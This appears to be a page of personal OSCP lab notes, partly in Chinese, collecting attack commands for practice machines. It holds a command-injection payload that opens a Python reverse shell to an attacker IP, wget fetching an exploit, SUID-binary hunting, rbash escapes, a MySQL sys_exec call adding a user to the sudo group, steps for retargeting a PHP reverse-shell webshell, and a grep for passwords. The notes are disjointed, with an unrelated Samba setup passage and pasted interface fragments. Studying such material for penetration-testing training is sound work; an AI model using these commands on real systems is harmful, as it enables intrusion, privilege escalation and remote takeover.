find / -type f -user root -perm -4000 2>/dev/null

```Bash
find / -perm -u=s -type f 2>/dev/null
find / -type f -user root -perm -4000 2>/dev/null 
```

  

if get a rbash, can use

```JavaScript
python -c 'import pty;pty.spawn("/bin/bash")'
```

```Bash
python3 -c "import pty;pty.spawn('/bin/bash')"

```

```Bash
ssh seppuku@192.168.226.90 -t "bash --noprofile"
```

or after into rbash

```Bash
bash
sh
```

  

```JavaScript
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color

Ctrl + Z [Background Process]

alias ll='ls -lsaht --color=auto'

stty raw -echo ; fg ; reset
stty columns 200 rows 200

getcatp -r 2>/dev/null

```

```JavaScript
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
```

  

  

  

  

3 aug oscp Dawn

```Plain
nmap find it have smb -> smbclinet -L 
got: ITDEPT          Disk      PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY. 
hint: we go ITDEPT direction
smbclient \\\\ip\\IDDEPT ,  
in smb can write


```

Add the following lines to the file:

```Plain
[share]
path = /path/to/shared/folder
available = yes
valid users = your_username
read only = no
browseable = yes
public = yes
writable = yes
```

Save the file and exit. Then, restart the Samba service:

```Plain
sudo service smbd restart
```

Now you should be able to access the shared folder from another machine on the network using the following address:

```Plain
\\\\your_ubuntu_machine_ip_address\\share
```

Replace `your_ubuntu_machine_ip_address` with the IP address of your Ubuntu machine.

ka

[[R shell]]

127.0.0.1 &&python -c 'import os,socket,sys,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.62.156",443));[os.dup2(s.fileno(),fd)for fd in (0,1,2)];pty.spawn("/bin/bash");'  

find / -uid 0 -perm -4000 -type f 2>/dev/null

  

  

wget [http://192.168.1.113:8000/9545.c](http://192.168.1.106:8000/9545.c)

  

  

ssh -oHostKeyAlgorithms=ssh-rsa,ssh-dss user@192.168.64.2

  

echo os.system("/bin/bash")

  

  

find / -perm -u=s -type f 2>/dev/null

find / -type f -user root -perm -4000 2>/dev/null

  

mysql -uroot -p

sudo /bin/bash

  

# a|--append #\#把用户追加到某些组中，仅与-G选项一起使用

# G|--groups #\#把用户追加到某些组中，仅与-a选项一起使用

select sys_exec('usermod -a -G sudo john');

  

  

[[LinEnum.sh]]

  

  

  

use python get a better shell

  

```Bash
python3 -c "import pty;pty.spawn('/bin/bash')"
```

  

  

shell.php localed in `1. sudo cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php`

  

`grep -n "127.0.0.1" shell.php` //find the number of line which have 127.0.0.1 in file shell.php

1. `sed -i '49s/127.0.0.1/192.168.45.220/' shell.php` //

`**-i**` flag for in-place editing , 49s s:substitution

  

`1. sed -n '49,50p' shell.php` // -n print number of line, 50p ◦ `**p**`: The command to print the specified lines.  
•

grep -arin -o -E '(\w+\W+){0,5}password(\W+\w+){0,5}' .

  

  

  
  

```Bash
python3 -m http.server
```

1. 在攻击机上使用screen/tmux：  
    bash

Run

Open Folder

1

screen -S attack_shell

这一步的作用是：

- 创建一个新的screen会话，命名为"attack_shell"
- 提供一个持久的终端环境，即使SSH连接断开也不会丢失会话
- 允许随时分离和重新连接会话

1. 在目标机器上获取并升级shell：  
    bash

Run

Open Folder

1

2

3

python -c 'import pty; pty.spawn("/bin/bash")'

export TERM = xterm

stty raw -echo ; fg

这些命令的作用是：

- Python的pty模块创建一个伪终端，提供完整的终端功能
- 设置终端类型为xterm，确保正确的终端特性
- stty raw -echo关闭本地回显，fg将shell带到前台
- 这样可以获得一个完整的交互式shell

1. 配置shell环境：  
    bash

Run

Open Folder

1

2

export SHELL = bash

stty rows 38 columns 116

这一步的作用是：

- 设置默认shell为bash
- 配置终端窗口大小，确保正确的显示格式
- rows和columns的值可以根据实际终端大小调整  
    这整个过程的好处：

1. 获得完整的终端功能（tab补全、历史记录等）
2. 支持所有shell快捷键（Ctrl+C, Ctrl+Z等）
3. 即使网络不稳定也能保持会话
4. 提供更好的命令行编辑能力
5. 支持诸如vim等全屏应用程序  
    注意事项：

- 确保目标系统安装了Python
- screen/tmux命令需要在攻击机上执行
- 其他命令在目标机器的shell中执行
- 终端大小可以根据需要调整

  

  

[[Notion/OSCP 2/reverse shell]]

[[Azure Admin Group]]

[[rbash]]

[[gtfobins]]

[[PATH]]

[[OSCP 2/nmap|nmap]]

[[seppuku]]

[[EvilBox-One]]

[[AD]]

[[python3]]